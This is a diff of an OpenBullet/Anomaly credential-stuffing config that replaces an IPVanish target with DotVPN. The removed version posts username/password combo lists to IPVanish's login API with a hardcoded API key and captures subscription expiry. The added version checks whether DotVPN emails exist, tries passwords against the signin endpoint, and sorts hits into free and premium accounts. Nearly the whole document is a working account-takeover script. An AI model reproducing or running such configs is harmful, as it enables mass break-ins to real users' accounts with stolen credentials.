@@ -1,11 +1,11 @@
 [SETTINGS]
 {
-  "Name": "IPVanish",
-  "SuggestedBots": 100,
+  "Name": "DotVPN",
+  "SuggestedBots": 30,
   "MaxCPM": 0,
-  "LastModified": "2020-09-04T16:20:07.453103+04:30",
+  "LastModified": "2020-09-04T15:54:12.52269+04:30",
   "AdditionalInfo": "",
-  "Author": "",
+  "Author": "\"The_FiendQQ\"",
   "Version": "1.4.4 [Anomaly]",
   "IgnoreResponseErrors": false,
   "MaxRedirects": 8,
@@ -15,7 +15,7 @@
   "MaxProxyUses": 0,
   "BanProxyAfterGoodStatus": false,
   "EncodeData": false,
-  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist1": "Credentials",
   "AllowedWordlist2": "",
   "DataRules": [],
   "CustomInputs": [],
@@ -50,28 +50,40 @@
 }
 
 [SCRIPT]
-FUNCTION GenerateGUID -> VAR "uuid" 
+#Length FUNCTION Length "{\"email\":\"<USER>\"}" -> VAR "Length" 
 
-REQUEST POST "https://account.ipvanish.com/api/v3/login" 
-  CONTENT "{\"api_key\":\"15cb936e6d19cd7db1d6f94b96017541\",\"client\":\"Android-3.4.2.4.52178b52178\",\"os\":\"22\",\"password\":\"<PASS>\",\"username\":\"<USER>\",\"uuid\":\"<uuid>\"}" 
+#LoginEmail REQUEST POST "https://apache-iv.com/3/user/check" 
+  CONTENT "{\"email\":\"<USER>\"}" 
   CONTENTTYPE "application/json" 
-  HEADER "X-Client: ipvanish" 
-  HEADER "X-Client-Version: 1.2." 
-  HEADER "X-Platform: Android" 
-  HEADER "X-Platform-Version: 22" 
-  HEADER "Host: account.ipvanish.com" 
+  HEADER "Accept: application/json" 
+  HEADER "Host: apache-iv.com" 
   HEADER "Connection: Keep-Alive" 
-  HEADER "User-Agent: okhttp/3.12.0" 
-  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: <Length>" 
 
 KEYCHECK 
   KEYCHAIN Success OR 
-    KEY "email" 
-    KEY "access_token" 
+    KEY "{\"code\":3,\"name\":\"\"}" 
+    KEY "{\"code\":3" 
   KEYCHAIN Failure OR 
-    KEY "The username or password provided is incorrect" 
+    KEY "{\"code\":0}" 
 
-PARSE "<SOURCE>" JSON "sub_end_epoch" -> VAR "expire" 
+#Length FUNCTION Length "{\"email\":\"<USER>\",\"passwd\":\"<PASS>\"}" -> VAR "Ln2" 
 
-#Expiry_Date FUNCTION UnixTimeToDate "<expire>" -> CAP "Expiry Date" 
+#Login REQUEST POST "https://apache-iv.com/3/user/signin" 
+  CONTENT "{\"email\":\"<USER>\",\"passwd\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "Host: apache-iv.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Content-Length: <Ln2>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"code\":2}" 
+  KEYCHAIN Success OR 
+    KEY "{\"code\":0,\"udid" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "{\"premium\":0" 
 
